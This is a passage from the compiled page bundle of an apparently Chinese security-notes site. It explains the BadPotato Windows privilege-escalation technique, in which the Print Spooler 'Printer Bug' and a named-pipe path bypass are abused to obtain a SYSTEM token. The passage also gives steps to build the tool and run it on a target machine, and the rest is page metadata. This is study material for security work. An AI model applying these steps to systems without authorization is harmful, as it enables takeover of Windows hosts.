src="http://cdn.ayusummer233.top/DailyNotes/202412111414916.png" alt="image-20241211141431814"></p></li></ul><p>通过 Printer Bug 利用SpoolSample,打印机窃取system Token,使用 Print Spooler 服务公开的函数 RpcRemoteFindFirstPrinterChangeNotificationEx 向打印客户端发送更改通知，通知通过RPC匿名管道， RPC 接口是通过命名管道公开的：\`\`\\.\\pipe\\spoolss<code>的正常情况下UNC路径会被占用使用\\进行分割,使用/通过路径验证检查比如</code>\\DESKTOP-ASD29\\abc\\pipe\\spoolss<code>被使用验证路径失败改为</code>\\DESKTOP-ASD29/pipe/abc<code>则会自动转换为</code>\\\\DESKTOP-ASD29\\pipe\\abc\\pipe\\spoolss\` 转为一个新有效的路径并绕过路径检查获取SpoolSample系统Token获取模拟令牌进行提权。</p><hr><h3 id="使用方法" tabindex="-1"><a class="header-anchor" href="#使用方法"><span>使用方法</span></a></h3><p>clone <a href="https://github.com/BeichenDream/BadPotato" target="_blank" rel="noopener noreferrer">BadPotato 仓库源码</a> 到本地使用 VisualStudio 打开项目并生成可执行程序</p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202412111417816.png" alt="image-20241211141703735"></p>`,86)),e("blockquote",null,[e("p",null,[i[1]||(i[1]=t("提示缺失 .NETFramework 4.0 开发工具包的话可以参阅 ")),r(s,{to:"/Language/CSharp/csharp.html#visual-studio-2022-%E5%AE%89%E8%A3%85net%E6%97%A7%E7%89%88%E6%9C%ACnet-framework40"},{default:o(()=>i[0]||(i[0]=[t("此方式")])),_:1}),i[2]||(i[2]=t(" 解决"))])]),i[4]||(i[4]=e("p",null,[t("然后在项目目录 "),e("code",null,"bin/Debug"),t(" 中可以看到生成的 exe 文件：")],-1)),i[5]||(i[5]=e("p",null,[e("img",{src:"http://cdn.ayusummer233.top/DailyNotes/202412111419549.png",alt:"image-20241211141923486"})],-1)),i[6]||(i[6]=e("p",null,[t("将文件复制到靶机执行 "),e("code",null,"BadPotato.exe [命令行]"),t(" 即可使用，例如：")],-1)),i[7]||(i[7]=e("p",null,[e("img",{src:"http://cdn.ayusummer233.top/DailyNotes/202412111420806.png",alt:"image-20241211142017710"})],-1)),i[8]||(i[8]=e("hr",null,null,-1))])}const m=a(h,[["render",c],["__file","土豆提权.html.vue"]]),y=JSON.parse('{"path":"/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E7%AB%AF%E7%82%B9%E5%AE%89%E5%85%A8/Windows/%E6%8F%90%E6%9D%83/%E5%9C%9F%E8%B1%86%E6%8F%90%E6%9D%83.html","title":"土豆提权","lang":"zh-CN","frontmatter":{"category":["网络安全","端点安全"],"tags":["Windows","提权","土豆提权"],"excerpt":"Windows土豆家族提权工具","description":"土豆提权 土豆提权 概述 Windows 用户 利用前提 HotPotato 影响范围 原理 利用过程 Tater 利用过程 Windows 7 使用 trigger 1 （NBNS WPAD Bruteforce + Windows Defender Signature Updates） Windows 10 using trigger 2 (Web...","head":[["meta",{"property":"og:url","content":"https://233official.github.io/dailynotes/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E7%AB%AF%E7%82%B9%E5%AE%89%E5%85%A8/Windows/%E6%8F%90%E6%9D%83/%E5%9C%9F%E8%B1%86%E6%8F%90%E6%9D%83.html"}],["meta",{"property":"og:site_name","content":"DailyNotes"}],["meta",{"property":"og:title","content":"土豆提权"}],["meta",{"property":"og:description","content":"土豆提权 土豆提权 概述 Windows 用户 利用前提 HotPotato 影响范围 原理 利用过程 Tater 利用过程 Windows 7 使用 trigger 1 （NBNS WPAD Bruteforce + Windows Defender Signature Updates） Windows 10 using trigger 2 (Web..."}],["meta",{"property":"og:type","content":"article"}],["meta",{"property":"og:image","content":"http://cdn.ayusummer233.top/DailyNotes/202412251809218.png"}],["meta",{"property":"og:locale","content":"zh-CN"}],["meta",{"property":"og:updated_time","content":"2025-04-17T03:32:15.000Z"}],["meta",{"property":"article:tag","content":"Windows"}],["meta",{"property":"article:tag","content":"提权"}],["meta",{"property":"article:tag","content":"土豆提权"}],["meta",{"property":"article:modified_time","content":"2025-04-17T03:32:15.000Z"}],["script",{"type":"application/ld+json"},"{\\"@context\\":\\"https://schema.org\\",\\"@type\\":\\"Article\\",\\"headline\\":\\"土豆提权\\",\\"image\\":[\\"http://cdn.ayusummer233.top/DailyNotes/202412251809218.png\\",\\"http://cdn.ayusummer233.top/DailyNotes/202412251817435.png\\",\\"http://cdn.ayusummer233.top/DailyNotes/202412251810440.png\\",\\"http://cdn.ayusummer233.top/DailyNotes/202412251826485.png\\",\\"http://cdn.ayusummer233.top/DailyNotes/202412251900819.png\\",\\"http://cdn.ayusummer233.top/DailyNotes/202412251904690.png\\",\\"http://cdn.ayusummer233.top/DailyNotes/202412251907098.png\\",\\"http://cdn.ayusummer233.top/DailyNotes/202412121644967.png\\",\\"http://cdn.ayusummer233.top/DailyNotes/202412121646221.png\\",\\"http://cdn.ayusummer233.top/DailyNotes/202412190142338.png\\",\\"http://cdn.ayusummer233.top/DailyNotes/202412190143970.png\\",\\"http://cdn.ayusummer233.top/DailyNotes/202412190146440.png\\",\\"http://cdn.ayusummer233.top/DailyNotes/202412131621980.png\\",\\"http://cdn.ayusummer233.top/DailyNotes/202412190229047.png\\",\\"http://cdn.ayusummer233.top/DailyNotes/202412190235347.png\\",\\"http://cdn.ayusummer233.top/DailyNotes/202412131741991.png\\",\\"http://cdn.ayusummer233.top/DailyNotes/202412131724596.png\\",\\"http://cdn.ayusummer233.top/DailyNotes/202412131725342.png\\",\\"http://cdn.ayusummer233.top/DailyNotes/202412171128371.png\\",\\"http://cdn.ayusummer233.top/DailyNotes/202412191754373.png\\",\\"http://cdn.ayusummer233.top/DailyNotes/202412191759931.png\\",\\"http://cdn.ayusummer233.top/DailyNotes/202412111414916.png\\",\\"http://cdn.ayusummer233.top/DailyNotes/202412111417816.png\\",\\"http://cdn.ayusummer233.top/DailyNotes/202412111419549.png\\",\\"http://cdn.ayusummer233.top/DailyNotes/202412111420806.png\\"],\\"dateModified\\":\\"2025-04-17T03:32:15.000Z\\",\\"author\\":[{\\"@type\\":\\"Person\\",\\"name\\":\\"咸鱼型233\\",\\"url\\":\\"https://233official.github.io/dailynotes/\\"}]}"]],"date":"2024-12-12T12:22:36.000Z"},"headers":[{"level":2,"title":"概述","slug":"概述","link":"#概述","children":[]},{"level":2,"title":"Windows 用户","slug":"windows-用户","link":"#windows-用户","children":[]},{"level":2,"title":"利用前提","slug":"利用前提","link":"#利用前提","children":[]},{"level":2,"title":"HotPotato","slug":"hotpotato","link":"#hotpotato","children":[{"level":3,"title":"影响范围","slug":"影响范围","link":"#影响范围","children":[]},{"level":3,"title":"原理","slug":"原理","link":"#原理","children":[]},{"level":3,"title":"利用过程","slug":"利用过程","link":"#利用过程","children":[]}]},{"level":2,"title":"Tater","slug":"tater","link":"#tater","children":[{"level":3,"title":"利用过程","slug":"利用过程-1","link":"#利用过程-1","children":[]}]},{"level":2,"title":"BadPotato","slug":"badpotato","link":"#badpotato","children":[{"level":3,"title":"使用方法","slug":"使用方法","link":"#使用方法","children":[]}]}],"git":{"createdTime":1734006156000,"updatedTime":1744860735000,"contributors":[{"name":"233Mac","username":"233Mac","email":"ayusummer233@vip.qq.com","commits":8,"url":"https://github.com/233Mac"},{"name":"233PC","username":"233PC","email":"ayusummer233@vip.qq.com","commits":1,"url":"https://github.com/233PC"}]},"readingTime":{"minutes":8.85,"words":2656},"filePathRelative":"网络安全/端点安全/Windows/提权/土豆提权.md","localizedDate":"2024年12月12日","autoDesc":true}');export{m as comp,y as data};
